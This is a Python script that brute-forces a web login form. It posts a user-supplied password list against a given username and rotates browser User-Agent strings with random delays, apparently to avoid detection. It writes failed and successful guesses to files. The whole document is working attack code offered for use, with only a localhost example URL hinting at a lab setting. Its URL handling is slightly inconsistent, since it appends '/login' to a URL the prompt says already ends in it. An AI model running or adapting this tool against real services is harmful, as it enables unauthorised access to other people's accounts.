import requests
import random
import time

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    ]
    return random.choice(user_agents)

def brute_force_login():
    print("★ Brute Force Login ★\n")
    url = input("Enter the login URL (e.g., http://127.0.0.1:5000/login): ").strip()
    username = input("Enter the username: ").strip()
    password_list = input("Enter passwords separated by commas: ").strip().split(',')

    session = requests.Session()
    failed_attempts = []
    success_attempts = []

    for password in password_list:
        password = password.strip()
        print(f"Trying password: {password}")
        headers = {'User-Agent': random_user_agent()}
        payload = {'username': username, 'password': password}

        try:
            response = session.post(url + "/login", data=payload, headers=headers)  # Make sure to add '/login'
            if response.status_code == 200 and "Login successful" in response.text:
                print(f"✔ Password found: {password}")
                success_attempts.append(password)
                break  
            else:
                print("✘ Incorrect password.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

        failed_attempts.append(password)
        time.sleep(random.uniform(1, 3))  


    if failed_attempts:
        with open("failed_attempts.txt", "w") as f:
            f.writelines(f"{pwd}\n" for pwd in failed_attempts)
        print("\nFailed attempts saved to 'failed_attempts.txt'.")

    if success_attempts:
        with open("success_attempts.txt", "w") as f:
            f.write(success_attempts[0] + "\n")
        print("Successful attempts saved to 'success_attempts.txt'.")
    else:
        print("✘ Password not found.")

if __name__ == "__main__":
    brute_force_login()
